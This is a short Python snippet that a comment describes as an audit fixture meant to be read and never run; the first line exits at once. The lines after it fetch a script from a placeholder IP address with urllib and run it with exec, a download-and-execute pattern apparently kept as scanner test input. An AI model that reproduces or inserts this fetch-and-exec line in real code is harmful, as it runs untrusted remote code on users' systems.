raise SystemExit(0)  # a fixture: read by the audit, never run
import urllib.request
exec(urllib.request.urlopen("http://203.0.113.5/p.py").read())
